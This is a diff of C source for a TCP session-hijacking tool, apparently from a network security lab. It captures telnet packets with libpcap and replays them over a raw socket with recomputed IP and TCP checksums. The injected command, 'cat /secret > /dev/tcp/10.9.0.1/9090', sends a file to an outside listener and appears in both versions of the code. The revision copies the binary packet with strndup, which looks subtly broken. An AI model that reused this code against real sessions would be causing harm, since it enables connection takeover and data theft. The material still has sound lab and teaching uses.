@@ -55,108 +55,74 @@ typedef struct {
 	uint16_t tcp_len;
 } psh_t;
 
-u_char packet_buffer[4096] = {0};
-u_char tcp_psuedo_buff[4046] = {0};
+void send_modified_packet(u_char *pkt_buf, const char *cmd) {
+	eth_t *eth = (eth_t *)pkt_buf;
+	if (ntohs(eth->header.ether_type) != ETHERTYPE_IP)
+		return;
 
-void send_command(const char *target_ip, u_short target_port,
-				  const char *source_ip, u_short source_port, u_long seq_number,
-				  const char *command) {
+	ip_t *ip = (ip_t *)eth->data;
+	if (ip->header.protocol != IPPROTO_TCP)
+		return;
+
+	tcp_t *tcp = (tcp_t *)ip->data;
+
+	u_char *payload_ptr = tcp->data;
+	u_int cmd_len = strlen(cmd);
+	memcpy(tcp->data, cmd, cmd_len);
+
+	int total_ip_len = sizeof(ip_t) + sizeof(tcp_t) + cmd_len;
+	ip->header.tot_len = htons(total_ip_len);
+
+	// 5. Recalculate IP Checksum
+	ip->header.check = 0;
+	ip->header.check = in_checksum((unsigned short *)ip, sizeof(ip_t));
+
+	// 6. Recalculate TCP Checksum with Pseudo-Header
+	tcp->header.check = 0;
+	int tcp_segment_len = sizeof(tcp_t) + cmd_len;
+
+	psh_t psh;
+	psh.src_addr = ip->header.saddr;
+	psh.dst_addr = ip->header.daddr;
+	psh._placeholder = 0;
+	psh.protocol = IPPROTO_TCP;
+	psh.tcp_len = htons(tcp_segment_len);
+
+	u_char pseudo_buff[4096];
+	memcpy(pseudo_buff, &psh, sizeof(psh_t));
+	memcpy(pseudo_buff + sizeof(psh_t), tcp, tcp_segment_len);
+
+	tcp->header.check = in_checksum((unsigned short *)pseudo_buff,
+									sizeof(psh_t) + tcp_segment_len);
+
+	// 7. Send packet using AF_INET raw socket (Kernel handles Link Layer)
 	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	if (sock < 0) {
+		perror("Socket creation failed");
+		return;
+	}
 
 	int one = 1;
-
 	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
 
-	ip_t *ip_pkt = (ip_t *)packet_buffer;
-
-	ip_pkt->header.saddr = arc4random();
-
 	struct sockaddr_in sin;
-
 	sin.sin_family = AF_INET;
-	sin.sin_port = htons(target_port);
-	sin.sin_addr.s_addr = inet_addr(target_ip);
+	sin.sin_port = tcp->header.dest;
+	sin.sin_addr.s_addr = ip->header.daddr;
 
-	ip_pkt->header.ihl = 5;
-	ip_pkt->header.version = 4;
-	ip_pkt->header.tos = 0;
-	ip_pkt->header.tot_len = htons(sizeof(ip_t) + sizeof(tcp_t));
-	ip_pkt->header.id = htons(42069);
-	ip_pkt->header.frag_off = 0;
-	ip_pkt->header.ttl = 255;
-	ip_pkt->header.protocol = IPPROTO_TCP;
-	ip_pkt->header.check = 0;
-	ip_pkt->header.saddr = inet_addr(source_ip);
-	ip_pkt->header.daddr = sin.sin_addr.s_addr;
-
-	tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;
-
-	tcp_pkt->header.source = htons(source_port);
-	tcp_pkt->header.dest = htons(target_port);
-	tcp_pkt->header.seq = htonl(seq_number);
-	tcp_pkt->header.ack_seq = 0;
-	tcp_pkt->header.doff = 5;
-
-	tcp_pkt->header.th_flags = 0;
-	tcp_pkt->header.check = 0;
-	tcp_pkt->header.urg_ptr = 0;
-
-	u_int cmd_len = strlen(command) + 1;
-	memcpy(tcp_pkt->data, command, cmd_len);
-
-	psh_t *tcp_chksum_buff = (psh_t *)tcp_psuedo_buff;
-	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t) + cmd_len);
-
-	tcp_chksum_buff->src_addr = ip_pkt->header.saddr;
-	tcp_chksum_buff->dst_addr = ip_pkt->header.daddr;
-	tcp_chksum_buff->_placeholder = 0;
-	tcp_chksum_buff->protocol = IPPROTO_TCP;
-	tcp_chksum_buff->tcp_len = htons(sizeof(tcp_t) + cmd_len);
-
-	int transmit_len = sizeof(ip_t) + sizeof(tcp_t) + cmd_len;
-
-	ip_pkt->header.check = in_checksum((u_short *)ip_pkt, sizeof(ip_t));
-
-	memcpy(tcp_psuedo_buff + sizeof(psh_t), tcp_pkt, sizeof(tcp_t) + cmd_len);
-
-	tcp_pkt->header.check = in_checksum(
-		(u_short *)tcp_psuedo_buff, sizeof(psh_t) + sizeof(tcp_t) + cmd_len);
-
-	sendto(sock, packet_buffer, transmit_len, 0, (struct sockaddr *)&sin,
-		   sizeof(sin));
+	sendto(sock, ip, total_ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
 
 	close(sock);
 }
 
 void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
 			   const u_char *packet) {
-	eth_t *link_pkt = (eth_t *)packet;
+	u_char *pkt_copy = (u_char *)strndup((const char *)packet, header->caplen);
+	const char *new_payload = "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r\n";
 
-	if (ntohs(link_pkt->header.ether_type) == ETHERTYPE_IP) {
-		ip_t *ip_pkt = (ip_t *)link_pkt->data;
+	send_modified_packet(pkt_copy, new_payload);
 
-		char src_ip[INET_ADDRSTRLEN];
-		char dst_ip[INET_ADDRSTRLEN];
-
-		inet_ntop(AF_INET, &ip_pkt->header.saddr, src_ip, INET_ADDRSTRLEN);
-		inet_ntop(AF_INET, &ip_pkt->header.daddr, dst_ip, INET_ADDRSTRLEN);
-		struct protoent *proto = getprotobynumber(ip_pkt->header.protocol);
-
-		if (ip_pkt->header.protocol == IPPROTO_TCP) {
-			tcp_t *tcp_pkt = (tcp_t *)ip_pkt->data;
-
-			u_short src_port = ntohs(tcp_pkt->header.source);
-			u_short dst_port = ntohs(tcp_pkt->header.dest);
-			u_long seq = ntohl(tcp_pkt->header.ack_seq);
-
-			printf(
-				"Hijacked (src=%s:%hu, dst=%s:%hu) with sequence number %lu\n",
-				src_ip, src_port, dst_ip, dst_port, seq);
-
-			send_command(src_ip, src_port, dst_ip, dst_port, seq,
-						 "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r\n");
-		}
-	}
+	free(pkt_copy);
 }
 
 #define LOG_ON_ERROR(exp, handle)                                              \
@@ -196,7 +162,7 @@ int main() {
 	char *bridge_iface = find_bridge_interface(alldevsp);
 
 	pcap_t *handle = pcap_open_live(bridge_iface, 262144, 1, 1000, err_buff);
-	apply_filter(handle, "tcp src port 23");
+	apply_filter(handle, "tcp dst port 23");
 
 	printf("Running on interface %s\n", bridge_iface);
 
